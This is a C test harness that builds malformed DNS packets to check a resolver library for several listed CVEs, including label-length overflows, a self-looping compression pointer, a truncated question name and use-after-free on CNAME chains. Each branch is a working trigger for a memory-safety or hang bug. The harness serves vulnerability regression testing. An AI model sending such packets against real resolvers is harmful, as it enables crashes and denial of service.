/* unit harness: crafted DNS packets -> resolver routines */
#include <snx.h>
#include <arpa/inet.h>
#include <signal.h>
#include <unistd.h>

#include "../src/snx_resolver.c"

static void
on_alarm(int sig)
{
    (void) sig;
    printf("VULNERABLE: unbounded compression-pointer follow (hang)\n");
    fflush(stdout);
    _exit(0);
}

static void
mkpkt(uchar *buf, size_t *n, int qd, int an)
{
    snx_dns_hdr_t *h = (snx_dns_hdr_t *) buf;
    memset(h, 0, sizeof(*h));
    h->id = htons(1);
    h->flags = htons(0x8180);
    h->qd = htons(qd);
    h->an = htons(an);
    *n = sizeof(snx_dns_hdr_t);
}

int
main(int argc, char **argv)
{
    const char *cve = argc > 1 ? argv[1] : "";
    snx_rslv_ctx_t ctx;
    static uchar pkt[2048];
    size_t n;
    snx_str_t out;

    ctx.arena = snx_arena_new(8192);
    ctx.chain = NULL;
    ctx.nchain = 0;
    ctx.pkt = pkt;

    if (strcmp(cve, "CVE-2021-23017") == 0) {
        /* labels totalling 127 bytes: w reaches d+128, terminator
           write lands one byte past the 128-byte name buffer */
        mkpkt(pkt, &n, 0, 0);
        {
            uchar *s = pkt + n;
            *s++ = 63; memset(s, 'a', 63); s += 63;
            *s++ = 63; memset(s, 'b', 63); s += 63;
            *s = 0;
            ctx.plen = s - pkt;
        }
        (void) snx_dns_name(&ctx, pkt + n, pkt + ctx.plen, &out);
        printf("no crash\n");

    } else if (strcmp(cve, "CVE-2011-4315") == 0) {
        /* labels summing >128: unbounded copy overflows name buf */
        mkpkt(pkt, &n, 0, 0);
        {
            uchar *s = pkt + n;
            int  i;
            for (i = 0; i < 5; i++) {
                *s++ = 63; memset(s, 'x', 63); s += 63;
            }
            *s = 0;
            ctx.plen = s - pkt;
        }
        (void) snx_dns_name(&ctx, pkt + n, pkt + ctx.plen, &out);
        printf("no crash\n");

    } else if (strcmp(cve, "CVE-2016-0747") == 0) {
        /* compression pointer that targets itself: unbounded
           pointer-follow -> hang; runner kills on timeout */
        mkpkt(pkt, &n, 0, 0);
        {
            uchar *s = pkt + n;
            size_t  off = s - pkt;
            *s++ = 0xc0 | (uchar) ((off >> 8) & 0x3f);
            *s++ = (uchar) (off & 0xff);
            ctx.plen = s - pkt;
        }
        signal(SIGALRM, on_alarm);
        alarm(5);
        (void) snx_dns_name(&ctx, pkt + n, pkt + ctx.plen, &out);
        printf("returned (not vulnerable)\n");

    } else if (strcmp(cve, "CVE-2016-0742") == 0) {
        /* question name truncated at end: skip loop reads *p past
           the packet buffer */
        uchar *p2 = malloc(sizeof(snx_dns_hdr_t) + 5);
        mkpkt(p2, &n, 1, 1);
        {
            uchar *s = p2 + n;
            *s++ = 3; *s++ = 'a'; *s++ = 'b'; *s++ = 'c';
            ctx.pkt = p2;
            ctx.plen = s - p2;      /* no terminator, no qtype */
        }
        (void) snx_dns_parse(&ctx);
        printf("no crash\n");

    } else if (strcmp(cve, "CVE-2016-0746") == 0) {
        /* CNAME owner name is replaced by the target: the chain is
           walked after the ctx arena is freed */
        mkpkt(pkt, &n, 0, 1);
        {
            uchar *s = pkt + n;
            *s++ = 3; *s++ = 'w'; *s++ = 'w'; *s++ = 'w'; *s++ = 0;
            *s++ = 0; *s++ = 5;               /* CNAME */
            *s++ = 0; *s++ = 1;               /* class */
            *s++ = 0; *s++ = 0; *s++ = 0; *s++ = 60;  /* ttl */
            *s++ = 0; *s++ = 8;               /* rdlen */
            *s++ = 3; *s++ = 'e'; *s++ = 'v'; *s++ = 'l';
            *s++ = 3; *s++ = 'c'; *s++ = 'o'; *s++ = 'm';
            *s++ = 0;
            ctx.plen = s - pkt;
        }
        (void) snx_dns_parse(&ctx);
        snx_arena_free(ctx.arena);
        {
            volatile uchar c = ctx.chain->name.p[0];
            (void) c;
        }
        printf("no crash\n");

    } else if (strcmp(cve, "CVE-2026-40701") == 0) {
        /* ocsp hook returns chain nodes that outlive ctx recycle */
        snx_resolver_t rz;
        snx_str_t host = { (uchar *) "ocsp.example", 12 };
        snx_rslv_node_t *chain;
        rz.arena = snx_arena_new(8192);
        rz.evt = NULL;
        chain = snx_rslv_ocsp_hook(&rz, &host);
        snx_arena_free(rz.arena);
        {
            volatile uchar c = chain->name.p[0];
            (void) c;
        }
        printf("no crash\n");

    } else {
        fprintf(stderr, "unknown\n");
        return 2;
    }
    return 0;
}
